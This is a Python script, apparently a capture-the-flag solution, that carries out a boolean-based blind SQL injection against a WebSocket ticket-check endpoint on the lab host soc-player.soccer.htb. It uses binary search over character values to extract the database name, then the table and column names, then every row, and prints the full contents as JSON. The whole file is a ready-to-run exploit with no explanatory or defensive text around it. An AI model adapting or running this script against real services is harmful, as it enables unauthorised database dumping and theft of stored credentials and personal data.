#!/usr/bin/env python3

import json

from pwn import signal, sys, time
from typing import Callable, List
from websocket import create_connection

signal.signal(signal.SIGINT, lambda *_: print('Quitting...') or sys.exit(1))

TABLES = 'information_schema.tables'
COLUMNS = 'information_schema.columns'
COUNT = 'count(*)'

ws = create_connection('ws://soc-player.soccer.htb:9091/ws')


def do_sqli(payload: str) -> bool:
    ws.send(json.dumps({'id': f'1 or {payload}-- -'}))
    return ws.recv() == 'Ticket Exists'


def binary_search(checker: Callable[[int], bool], left: int, right: int) -> int:
    mid = (left + right) // 2

    if mid == left and checker(mid):
        return -1

    if not checker(mid) and (mid == right or checker(mid + 1)):
        return mid

    if not checker(mid):
        return binary_search(checker, mid + 1, right)

    return binary_search(checker, left, mid)


def get_data_length(payload: str, n: int) -> str:
    return f'length(convert(length({payload}),char))={n}'


def get_data_content(payload: str, i: int, c: int) -> str:
    return f'ascii(substr({payload},{i + 1},1))<{c}'


def get_length(payload: str) -> int:
    n = 1

    while not do_sqli(get_data_length(payload, n)):
        n += 1

        if n > 10:
            print('NOT FOUND')
            sys.exit()

    data = [' ' for _ in range(n)]
    payload = f'convert(length({payload}),char)'

    for i in range(n):
        get_content(data, payload, ord('0'), ord('9'), i)

    return int(''.join(data))


def get_content(data: List[str], payload: str, start: int, end: int, i: int):
    def checker(c: int) -> bool:
        return do_sqli(get_data_content(payload, i, c))

    ascii_value = binary_search(checker, start, end)

    data[i] = chr(ascii_value)


def dump_content(payload: str) -> str:
    n = get_length(payload)
    data = ['_' for _ in range(n)]

    for i in range(n):
        get_content(data, payload, 32, 126, i)

    return ''.join(data)


def sql(column: str, table: str, where: str = '', limit: int = -1) -> str:
    if not where and limit == -1:
        return f'(select {column} from {table})'
    elif limit == -1:
        return f'(select {column} from {table} where {where})'
    elif not where:
        return f'(select {column} from {table} limit {limit},1)'

    return f'(select {column} from {table} where {where} limit {limit},1)'


def dump_db():
    database = dump_content('database()')
    n_tables = dump_content(
        sql(COUNT, TABLES, f"table_schema='{database}'"))

    db = {database: {}}

    for i in range(int(n_tables)):
        table_name = dump_content(
            sql('table_name', TABLES, f"table_schema='{database}'", i))

        db[database][table_name] = {}

        n_cols = dump_content(
            sql(COUNT, COLUMNS, f"table_name='{table_name}' and table_schema='{database}'"))
        n_rows = dump_content(
            sql(COUNT, table_name))

        for j in range(int(n_cols)):
            column_name = dump_content(
                sql('column_name', COLUMNS, f"table_name='{table_name}' and table_schema='{database}'", j))

            if db[database][table_name].get(column_name) is None:
                db[database][table_name][column_name] = []

            for k in range(int(n_rows)):
                row_value = dump_content(
                    sql(column_name, table_name, limit=k))
                db[database][table_name][column_name].append(row_value)

    print(json.dumps(db, indent=2))


def main():
    start = time.time()
    dump_db()
    print('\nTime:', time.time() - start, 's')


if __name__ == '__main__':
    main()
